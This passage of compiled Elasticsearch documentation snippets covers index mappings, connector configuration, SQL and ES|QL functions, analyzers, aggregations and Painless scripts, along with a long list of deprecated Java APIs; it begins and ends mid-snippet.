\"status\" : {\n        \"type\" : \"keyword\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Non-Object Data in Disabled Fields\nDESCRIPTION: Shows how disabled fields can accept non-object data since field contents are not parsed. Demonstrates storing string data in a disabled object field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/enabled.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"session_data\": {\n        \"type\": \"object\",\n        \"enabled\": false\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/session_1\n{\n  \"session_data\": \"foo bar\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Connection Parameters\nDESCRIPTION: Configures basic connection settings for Elasticsearch and connectors. The snippet sets host and API key values necessary for authentication. Optional parameters include connector-specific API keys which override the default key if provided.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-confluence.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: confluence\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>\n```\n\n----------------------------------------\n\nTITLE: Setting Default Rollover Configuration\nDESCRIPTION: Dynamic cluster setting that defines conditions for data stream rollover. Includes max age, shard size, and document count conditions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/data-stream-lifecycle-settings.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\ncluster.lifecycle.default.rollover: \"max_age=auto,max_primary_shard_size=50gb,min_docs=1,max_primary_shard_docs=200000000\"\n```\n\n----------------------------------------\n\nTITLE: Extracting Minute of Hour with MINUTE_OF_HOUR in SQL\nDESCRIPTION: Extracts the minute of the hour from a date/datetime expression. Returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_60\n\nLANGUAGE: sql\nCODE:\n```\n\"MINUTE_OF_HOUR(datetime_exp) <1>\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT MINUTE_OF_HOUR(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS minute;\\n\\n    minute\\n---------------\\n23\\n\"\n```\n\n----------------------------------------\n\nTITLE: Sigmoid Function in Rank Feature Query\nDESCRIPTION: This snippet provides an example of using the sigmoid function in an Elasticsearch rank_feature query to compute relevance scores based on the field value with configurable pivot and exponent parameters. Suitable for indices where training has suggested appropriate values for these parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-rank-feature-query.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /test/_search\n{\n  \"query\": {\n    \"rank_feature\": {\n      \"field\": \"pagerank\",\n      \"sigmoid\": {\n        \"pivot\": 7,\n        \"exponent\": 0.6\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Fielddata Frequency Filtering in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure fielddata frequency filtering to reduce memory usage by only loading terms whose document frequency falls within specified boundaries. It includes min/max frequency settings and minimum segment size.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/text.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"tag\": {\n        \"type\": \"text\",\n        \"fielddata\": true,\n        \"fielddata_frequency_filter\": {\n          \"min\": 0.001,\n          \"max\": 0.1,\n          \"min_segment_size\": 500\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Extraction Service in YAML\nDESCRIPTION: Basic YAML configuration for enabling the self-hosted extraction service in the connector's config.yml file. Specifies the host endpoint for the extraction service.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-content-extraction.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n# data-extraction-service settings\nextraction_service:\n  host: http://localhost:8090\n```\n\n----------------------------------------\n\nTITLE: Dropbox Advanced Sync Rules - File Extension Filter\nDESCRIPTION: Advanced sync rules example with file extension filtering\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-dropbox.md#2025-04-21_snippet_7\n\nLANGUAGE: js\nCODE:\n```\n[\n  {\n    \"query\": \"dropbox\",\n    \"options\": {\n      \"file_extensions\": [\n        \"txt\",\n        \"pdf\"\n      ]\n    }\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Configuring Fingerprint Analyzer with Stopwords\nDESCRIPTION: Shows how to configure a custom fingerprint analyzer using English stopwords and testing it with sample text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-fingerprint-analyzer.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_fingerprint_analyzer\": {\n          \"type\": \"fingerprint\",\n          \"stopwords\": \"_english_\"\n        }\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_analyze\n{\n  \"analyzer\": \"my_fingerprint_analyzer\",\n  \"text\": \"Yes yes, Gödel said this sentence is consistent and.\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ consistent godel said sentence yes ]\n```\n\n----------------------------------------\n\nTITLE: Unweighted Average in Elasticsearch Moving Functions\nDESCRIPTION: Implementation of simple arithmetic mean using unweightedAvg function. Calculates average over a window without time-dependent weighting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-movfn-aggregation.md#2025-04-21_snippet_7\n\nLANGUAGE: json\nCODE:\n```\nPOST /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_date_histo\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"1M\"\n      },\n      \"aggs\": {\n        \"the_sum\": {\n          \"sum\": { \"field\": \"price\" }\n        },\n        \"the_movavg\": {\n          \"moving_fn\": {\n            \"buckets_path\": \"the_sum\",\n            \"window\": 10,\n            \"script\": \"MovingFunctions.unweightedAvg(values)\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing WKT MultiLineString in Elasticsearch\nDESCRIPTION: Example of indexing a Well-Known Text (WKT) MultiLineString geometry in Elasticsearch. This represents the same geometry as the GeoJSON example but using WKT syntax.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_13\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"MULTILINESTRING ((102.0 2.0, 103.0 2.0, 103.0 3.0, 102.0 3.0), (100.0 0.0, 101.0 0.0, 101.0 1.0, 100.0 1.0), (100.2 0.2, 100.8 0.2, 100.8 0.8, 100.2 0.8))\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Apostrophe Token Filter - Elasticsearch Console\nDESCRIPTION: This snippet illustrates how to create a custom analyzer in Elasticsearch that incorporates the apostrophe token filter. The example shows a PUT request to create an index named 'apostrophe_example' with specified settings to include the custom analyzer. Elasticsearch is required to execute the API call, and the output is the successful creation of the analyzer configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-apostrophe-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /apostrophe_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"standard_apostrophe\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"apostrophe\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Describing MEDIAN_ABSOLUTE_DEVIATION Function in ESQL\nDESCRIPTION: This markdown snippet provides a detailed explanation of the MEDIAN_ABSOLUTE_DEVIATION function in ESQL. It describes the function's purpose, its calculation method, and its usefulness for data with outliers or non-normal distributions. It also includes a note about the function's approximation nature, similar to the PERCENTILE function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/median_absolute_deviation.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Description**\n\nReturns the median absolute deviation, a measure of variability. It is a robust statistic, meaning that it is useful for describing data that may have outliers, or may not be normally distributed. For such data it can be more descriptive than standard deviation.  It is calculated as the median of each data point's deviation from the median of the entire sample. That is, for a random variable `X`, the median absolute deviation is `median(|median(X) - X|)`.\n\n::::{note}\nLike [`PERCENTILE`](/reference/query-languages/esql/functions-operators/aggregation-functions.md#esql-percentile), `MEDIAN_ABSOLUTE_DEVIATION` is [usually approximate](/reference/query-languages/esql/functions-operators/aggregation-functions.md#esql-percentile-approximate).\n::::\n```\n\n----------------------------------------\n\nTITLE: Keyword Analyzer in Elasticsearch\nDESCRIPTION: No-operation analyzer that outputs the exact input text as a single term without any modifications.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analyzer-reference.md#2025-04-21_snippet_4\n\nLANGUAGE: elasticsearch\nCODE:\n```\n\"analyzer\": \"keyword\"\n```\n\n----------------------------------------\n\nTITLE: Matrix Stats Aggregation with Missing Values in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to handle missing values in a matrix_stats aggregation. It specifies a default value for the income field when it's missing in a document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-matrix-stats-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"matrixstats\": {\n      \"matrix_stats\": {\n        \"fields\": [ \"poverty\", \"income\" ],\n        \"missing\": { \"income\": 50000 }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting Second of Minute with SECOND_OF_MINUTE in SQL\nDESCRIPTION: Extracts the second of the minute from a date/datetime expression. Returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_64\n\nLANGUAGE: sql\nCODE:\n```\n\"SECOND_OF_MINUTE(datetime_exp) <1>\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT SECOND_OF_MINUTE(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS second;\\n\\n    second\\n---------------\\n27\\n\"\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Simple Analyzer in Elasticsearch\nDESCRIPTION: Illustrates how to define a custom simple analyzer by duplicating and altering the default simple analyzer. This code snippet configures the analyzer without any additional token filters, allowing users to define them later. Provides the flexibility to enhance text processing capabilities beyond the default settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-simple-analyzer.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_custom_simple_analyzer\": {\n          \"tokenizer\": \"lowercase\",\n          \"filter\": [                          <1>\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a ServiceNow Connector Using the API - Python\nDESCRIPTION: This code snippet demonstrates how to create a self-managed ServiceNow connector using the Elasticsearch API. It includes the necessary HTTP method, endpoint, and payload structure required to successfully create the connector.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-servicenow.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _connector/my-servicenow-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from ServiceNow\",\n  \"service_type\": \"servicenow\"\n}\n```\n\n----------------------------------------\n\nTITLE: RLIKE Operator Syntax in Elasticsearch SQL\nDESCRIPTION: Shows the basic syntax for the RLIKE operator in Elasticsearch SQL. Similar to LIKE but uses regular expressions for more flexible pattern matching.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-like-rlike-operators.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nexpression         <1>\nRLIKE constant_exp <2>\n```\n\n----------------------------------------\n\nTITLE: Setting Preload During Index Creation\nDESCRIPTION: REST API call example demonstrating how to configure index.store.preload when creating a new index to preload specific file extensions into memory.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/preloading-data-into-file-system-cache.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"index.store.preload\": [\"nvd\", \"dvd\"]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: GREATEST Function\nDESCRIPTION: Returns the largest non-null value from a list of expressions. All arguments must be of the same data type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-conditional.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nGREATEST(\n    expression,\n    expression,\n    ...)\n```\n\n----------------------------------------\n\nTITLE: Deleting Connector and Associated Sync Jobs\nDESCRIPTION: Deletes the connector and its related sync jobs without affecting the created Elasticsearch index. Use API calls to perform the deletions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_19\n\nLANGUAGE: console\nCODE:\n```\nDELETE _connector/my-connector-id&delete_sync_jobs=true\nDELETE music\n```\n\n----------------------------------------\n\nTITLE: String Concatenation in Painless\nDESCRIPTION: Shows how to use the '+' operator for string concatenation in Painless, handling different data types, including automatic type conversion. Explains operator precedence and associativity in operations involving strings and integers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_18\n\nLANGUAGE: painless\nCODE:\n```\nString x = \"con\";\nString y = x + \"cat\";\nString z = 4 + 5 + x;\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Script Query with Custom Parameters\nDESCRIPTION: This snippet demonstrates how to use custom parameters within a script query in Elasticsearch. It passes the value `5` as the parameter `param1` to the script, which compares the `num1` field in the document to this parameter. This allows for dynamic script execution without modifying the script source.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"bool\": {\n      \"filter\": {\n        \"script\": {\n          \"script\": {\n            \"source\": \"doc['num1'].value > params.param1\",\n            \"lang\": \"painless\",\n            \"params\": {\n              \"param1\": 5\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using DATE_DIFF with microseconds in ESQL\nDESCRIPTION: This example shows how to calculate the difference in microseconds between two datetime values that are 1 millisecond apart, resulting in 1000 microseconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/date_diff.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW date1 = TO_DATETIME(\"2023-12-02T11:00:00.000Z\"),\n    date2 = TO_DATETIME(\"2023-12-02T11:00:00.001Z\")\n| EVAL dd_ms = DATE_DIFF(\"microseconds\", date1, date2)\n```\n\n----------------------------------------\n\nTITLE: Example of SIGN Function Usage\nDESCRIPTION: Demonstrates the SIGN function with negative, zero, and positive input values, showing the three possible return values (-1, 0, 1).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_29\n\nLANGUAGE: sql\nCODE:\n```\nSELECT SIGN(-123), SIGN(0), SIGN(415);\n\n  SIGN(-123)   |    SIGN(0)    |   SIGN(415)\n---------------+---------------+---------------\n-1             |0              |1\n```\n\n----------------------------------------\n\nTITLE: Querying Geo-bounding Box Using Lat Lon String Format\nDESCRIPTION: This Elasticsearch query demonstrates a `geo_bounding_box` filter with latitude and longitude represented as strings. The input format required is `latitude,longitude` and the output consists of documents intersecting the bounding box.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-bounding-box-query.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nGET my_locations/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_bounding_box\": {\n          \"pin.location\": {\n            \"top_left\": \"POINT (-74.1 40.73)\",\n            \"bottom_right\": \"POINT (-71.12 40.01)\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Listing Deprecated Java APIs and Methods\nDESCRIPTION: This snippet presents a comprehensive list of deprecated Java APIs, methods, and classes from various packages. It includes items from security, swing, SQL, and other Java packages that are no longer recommended for use in modern Java applications.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-deprecated.txt#2025-04-21_snippet_5\n\nLANGUAGE: Java\nCODE:\n```\njavax.security.auth.Subject#doAsPrivileged(javax.security.auth.Subject,java.security.PrivilegedExceptionAction,java.security.AccessControlContext)\njavax.security.auth.Subject#getSubject(java.security.AccessControlContext)\njavax.security.auth.SubjectDomainCombiner\njavax.security.cert.Certificate\njavax.security.cert.CertificateEncodingException\njavax.security.cert.CertificateException\njavax.security.cert.CertificateExpiredException\njavax.security.cert.CertificateNotYetValidException\njavax.security.cert.CertificateParsingException\njavax.security.cert.X509Certificate\njavax.sql.rowset.BaseRowSet#setUnicodeStream(int,java.io.InputStream,int)\njavax.sql.rowset.CachedRowSet#COMMIT_ON_ACCEPT_CHANGES\njavax.swing.AbstractButton#getLabel()\njavax.swing.AbstractButton#setLabel(java.lang.String)\njavax.swing.FocusManager#disableSwingFocusManager()\njavax.swing.FocusManager#isFocusManagerEnabled()\njavax.swing.ImageIcon#component\njavax.swing.ImageIcon#tracker\njavax.swing.InputVerifier#shouldYieldFocus(javax.swing.JComponent)\njavax.swing.JApplet\njavax.swing.JComponent#disable()\njavax.swing.JComponent#enable()\njavax.swing.JComponent#getNextFocusableComponent()\njavax.swing.JComponent#hide()\njavax.swing.JComponent#isManagingFocus()\njavax.swing.JComponent#requestDefaultFocus()\njavax.swing.JComponent#reshape(int,int,int,int)\njavax.swing.JComponent#setNextFocusableComponent(java.awt.Component)\njavax.swing.JComponent$AccessibleJComponent#accessibleFocusHandler\njavax.swing.JComponent$AccessibleJComponent$AccessibleFocusHandler\njavax.swing.JInternalFrame#getMenuBar()\njavax.swing.JInternalFrame#setMenuBar(javax.swing.JMenuBar)\njavax.swing.JList#getSelectedValues()\njavax.swing.JMenuBar#getComponentAtIndex(int)\njavax.swing.JPasswordField#getText()\njavax.swing.JPasswordField#getText(int,int)\njavax.swing.JPopupMenu#getComponentAtIndex(int)\njavax.swing.JRootPane#getMenuBar()\njavax.swing.JRootPane#setMenuBar(javax.swing.JMenuBar)\njavax.swing.JTable#createScrollPaneForTable(javax.swing.JTable)\njavax.swing.JTable#sizeColumnsToFit(boolean)\njavax.swing.JViewport#backingStore\njavax.swing.JViewport#isBackingStoreEnabled()\njavax.swing.JViewport#setBackingStoreEnabled(boolean)\njavax.swing.KeyStroke#getKeyStroke(char,boolean)\njavax.swing.RepaintManager#addDirtyRegion(java.applet.Applet,int,int,int,int)\njavax.swing.ScrollPaneLayout#getViewportBorderBounds(javax.swing.JScrollPane)\njavax.swing.SwingUtilities#findFocusOwner(java.awt.Component)\njavax.swing.plaf.TextUI#getToolTipText(javax.swing.text.JTextComponent,java.awt.Point)\njavax.swing.plaf.TextUI#modelToView(javax.swing.text.JTextComponent,int)\njavax.swing.plaf.TextUI#modelToView(javax.swing.text.JTextComponent,int,javax.swing.text.Position$Bias)\njavax.swing.plaf.TextUI#viewToModel(javax.swing.text.JTextComponent,java.awt.Point)\njavax.swing.plaf.TextUI#viewToModel(javax.swing.text.JTextComponent,java.awt.Point,javax.swing.text.Position$Bias[])\njavax.swing.plaf.basic.BasicDesktopPaneUI#closeKey\njavax.swing.plaf.basic.BasicDesktopPaneUI#maximizeKey\njavax.swing.plaf.basic.BasicDesktopPaneUI#minimizeKey\njavax.swing.plaf.basic.BasicDesktopPaneUI#navigateKey\njavax.swing.plaf.basic.BasicDesktopPaneUI#navigateKey2\njavax.swing.plaf.basic.BasicDirectoryModel#intervalAdded(javax.swing.event.ListDataEvent)\njavax.swing.plaf.basic.BasicDirectoryModel#intervalRemoved(javax.swing.event.ListDataEvent)\njavax.swing.plaf.basic.BasicDirectoryModel#lt(java.io.File,java.io.File)\njavax.swing.plaf.basic.BasicInternalFrameUI#openMenuKey\njavax.swing.plaf.basic.BasicMenuItemUI$MouseInputHandler\njavax.swing.plaf.basic.BasicScrollPaneUI$HSBChangeListener\njavax.swing.plaf.basic.BasicScrollPaneUI$PropertyChangeHandler\njavax.swing.plaf.basic.BasicScrollPaneUI$VSBChangeListener\njavax.swing.plaf.basic.BasicScrollPaneUI$ViewportChangeHandler\njavax.swing.plaf.basic.BasicSplitPaneUI#createKeyboardDownRightListener()\njavax.swing.plaf.basic.BasicSplitPaneUI#createKeyboardEndListener()\njavax.swing.plaf.basic.BasicSplitPaneUI#createKeyboardHomeListener()\njavax.swing.plaf.basic.BasicSplitPaneUI#createKeyboardResizeToggleListener()\njavax.swing.plaf.basic.BasicSplitPaneUI#createKeyboardUpLeftListener()\njavax.swing.plaf.basic.BasicSplitPaneUI#dividerResizeToggleKey\njavax.swing.plaf.basic.BasicSplitPaneUI#downKey\njavax.swing.plaf.basic.BasicSplitPaneUI#endKey\njavax.swing.plaf.basic.BasicSplitPaneUI#getDividerBorderSize()\njavax.swing.plaf.basic.BasicSplitPaneUI#homeKey\njavax.swing.plaf.basic.BasicSplitPaneUI#keyboardDownRightListener\njavax.swing.plaf.basic.BasicSplitPaneUI#keyboardEndListener\njavax.swing.plaf.basic.BasicSplitPaneUI#keyboardHomeListener\njavax.swing.plaf.basic.BasicSplitPaneUI#keyboardResizeToggleListener\njavax.swing.plaf.basic.BasicSplitPaneUI#keyboardUpLeftListener\njavax.swing.plaf.basic.BasicSplitPaneUI#leftKey\njavax.swing.plaf.basic.BasicSplitPaneUI#rightKey\njavax.swing.plaf.basic.BasicSplitPaneUI#upKey\njavax.swing.plaf.basic.BasicTabbedPaneUI#downKey\njavax.swing.plaf.basic.BasicTabbedPaneUI#leftKey\njavax.swing.plaf.basic.BasicTabbedPaneUI#rightKey\njavax.swing.plaf.basic.BasicTabbedPaneUI#upKey\njavax.swing.plaf.basic.BasicTextUI#modelToView(javax.swing.text.JTextComponent,int)\njavax.swing.plaf.basic.BasicTextUI#modelToView(javax.swing.text.JTextComponent,int,javax.swing.text.Position$Bias)\njavax.swing.plaf.basic.BasicTextUI#viewToModel(javax.swing.text.JTextComponent,java.awt.Point)\njavax.swing.plaf.basic.BasicTextUI#viewToModel(javax.swing.text.JTextComponent,java.awt.Point,javax.swing.text.Position$Bias[])\njavax.swing.plaf.basic.BasicToolBarUI#createFloatingFrame(javax.swing.JToolBar)\njavax.swing.plaf.basic.BasicToolBarUI#downKey\njavax.swing.plaf.basic.BasicToolBarUI#leftKey\njavax.swing.plaf.basic.BasicToolBarUI#rightKey\njavax.swing.plaf.basic.BasicToolBarUI#upKey\njavax.swing.plaf.metal.MetalComboBoxUI#editablePropertyChanged(java.beans.PropertyChangeEvent)\njavax.swing.plaf.metal.MetalComboBoxUI#removeListeners()\njavax.swing.plaf.metal.MetalComboBoxUI$MetalComboPopup\njavax.swing.plaf.metal.MetalFileChooserUI$FileRenderer\njavax.swing.plaf.metal.MetalFileChooserUI$SingleClickListener\njavax.swing.plaf.metal.MetalScrollPaneUI#uninstallListeners(javax.swing.JScrollPane)\njavax.swing.plaf.multi.MultiTextUI#modelToView(javax.swing.text.JTextComponent,int)\njavax.swing.plaf.multi.MultiTextUI#modelToView(javax.swing.text.JTextComponent,int,javax.swing.text.Position$Bias)\njavax.swing.plaf.multi.MultiTextUI#viewToModel(javax.swing.text.JTextComponent,java.awt.Point)\njavax.swing.plaf.multi.MultiTextUI#viewToModel(javax.swing.text.JTextComponent,java.awt.Point,javax.swing.text.Position$Bias[])\njavax.swing.table.TableColumn#disableResizedPosting()\njavax.swing.table.TableColumn#enableResizedPosting()\njavax.swing.table.TableColumn#resizedPostingDisableCount\njavax.swing.text.DefaultTextUI\njavax.swing.text.JTextComponent#modelToView(int)\njavax.swing.text.JTextComponent#viewToModel(java.awt.Point)\njavax.swing.text.LabelView#getFontMetrics()\njavax.swing.text.PasswordView#drawEchoCharacter(java.awt.Graphics,int,int,char)\njavax.swing.text.PasswordView#drawSelectedText(java.awt.Graphics,int,int,int,int)\njavax.swing.text.PasswordView#drawUnselectedText(java.awt.Graphics,int,int,int,int)\njavax.swing.text.PlainView#drawLine(int,java.awt.Graphics,int,int)\njavax.swing.text.PlainView#drawSelectedText(java.awt.Graphics,int,int,int,int)\njavax.swing.text.PlainView#drawUnselectedText(java.awt.Graphics,int,int,int,int)\njavax.swing.text.TableView#createTableCell(javax.swing.text.Element)\njavax.swing.text.TableView$TableCell\njavax.swing.text.Utilities#drawTabbedText(javax.swing.text.Segment,int,int,java.awt.Graphics,javax.swing.text.TabExpander,int)\njavax.swing.text.Utilities#getBreakLocation(javax.swing.text.Segment,java.awt.FontMetrics,int,int,javax.swing.text.TabExpander,int)\njavax.swing.text.Utilities#getPositionAbove(javax.swing.text.JTextComponent,int,int)\njavax.swing.text.Utilities#getPositionBelow(javax.swing.text.JTextComponent,int,int)\njavax.swing.text.Utilities#getTabbedTextOffset(javax.swing.text.Segment,java.awt.FontMetrics,int,int,javax.swing.text.TabExpander,int)\njavax.swing.text.Utilities#getTabbedTextOffset(javax.swing.text.Segment,java.awt.FontMetrics,int,int,javax.swing.text.TabExpander,int,boolean)\njavax.swing.text.Utilities#getTabbedTextWidth(javax.swing.text.Segment,java.awt.FontMetrics,int,javax.swing.text.TabExpander,int)\njavax.swing.text.View#modelToView(int,java.awt.Shape)\njavax.swing.text.View#viewToModel(float,float,java.awt.Shape)\njavax.swing.text.WrappedPlainView#drawLine(int,int,java.awt.Graphics,int,int)\njavax.swing.text.WrappedPlainView#drawSelectedText(java.awt.Graphics,int,int,int,int)\njavax.swing.text.WrappedPlainView#drawUnselectedText(java.awt.Graphics,int,int,int,int)\njavax.swing.text.html.FormView#RESET\njavax.swing.text.html.FormView#SUBMIT\njavax.swing.text.html.HTMLEditorKit$InsertHTMLTextAction#insertAtBoundry(javax.swing.JEditorPane,javax.swing.text.html.HTMLDocument,int,javax.swing.text.Element,java.lang.String,javax.swing.text.html.HTML$Tag,javax.swing.text.html.HTML$Tag)\njavax.swing.tree.DefaultTreeSelectionModel#notifyPathChange(java.util.Vector,javax.swing.tree.TreePath)\njavax.tools.StandardJavaFileManager#getJavaFileObjectsFromPaths(java.lang.Iterable)\njavax.tools.ToolProvider#getSystemToolClassLoader()\njavax.xml.stream.XMLEventFactory#newInstance(java.lang.String,java.lang.ClassLoader)\njavax.xml.stream.XMLInputFactory#newInstance(java.lang.String,java.lang.ClassLoader)\njavax.xml.stream.XMLOutputFactory#newInstance(java.lang.String,java.lang.ClassLoader)\norg.ietf.jgss.GSSContext#acceptSecContext(java.io.InputStream,java.io.OutputStream)\norg.ietf.jgss.GSSContext#getMIC(java.io.InputStream,java.io.OutputStream,org.ietf.jgss.MessageProp)\norg.ietf.jgss.GSSContext#initSecContext(java.io.InputStream,java.io.OutputStream)\norg.ietf.jgss.GSSContext#unwrap(java.io.InputStream,java.io.OutputStream,org.ietf.jgss.MessageProp)\norg.ietf.jgss.GSSContext#verifyMIC(java.io.InputStream,java.io.InputStream,org.ietf.jgss.MessageProp)\n```\n\n----------------------------------------\n\nTITLE: Defining ESQL String Parameter\nDESCRIPTION: Documentation block defining a string parameter for an ESQL function. Specifies that the parameter accepts a string expression and returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/ltrim.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n`string`\n:   String expression. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Updating a Field with Painless\nDESCRIPTION: Updates a player's last name using Painless and the _update API with parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/brief-painless-walkthrough.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPOST hockey/_update/1\n{\n  \"script\": {\n    \"lang\": \"painless\",\n    \"source\": \"ctx._source.last = params.last\",\n    \"params\": {\n      \"last\": \"hockey\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: MongoDB Find Query Sync Rule Example\nDESCRIPTION: JSON structure demonstrating a find query with text search and pagination options\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-mongodb.md#2025-04-21_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\n{\n\t\"find\": {\n\t\t\"filter\": {\n\t\t\t\"$text\": {\n\t\t\t\t\"$search\": \"garden\",\n\t\t\t\t\"$caseSensitive\": false\n\t\t\t}\n\t\t},\n\t\t\"skip\": 10,\n\t\t\"limit\": 